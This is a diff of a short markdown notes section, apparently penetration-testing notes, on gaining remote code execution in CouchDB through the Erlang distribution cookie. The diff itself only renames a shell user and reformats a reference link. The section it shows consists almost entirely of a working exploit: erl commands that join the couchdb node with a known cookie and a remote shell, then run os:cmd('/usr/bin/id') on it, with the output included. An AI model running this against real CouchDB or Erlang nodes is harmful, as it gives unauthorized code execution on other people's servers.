@@ -3,9 +3,9 @@
 ## Authentication Cookie RCE
 
 ```
-other-user@booj:/$ export HOME=/tmp
+otheruser@booj:/$ export HOME=/tmp
 export HOME=/tmp
-other-user@booj:/$ erl -sname booj -setcookie cookieval -remsh couchdb@localhost
+otheruser@booj:/$ erl -sname booj -setcookie cookieval -remsh couchdb@localhost
 <me booj -setcookie cookieval -remsh couchdb@localhost
 Eshell V7.3 (abort with ^G)
 (booj@booj)1> net_adm:ping(couchdb@localhost).
@@ -17,9 +17,5 @@ spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end
 <6881.23434.8>
 ```
 
-https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
-
-
-
-
+[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)
 
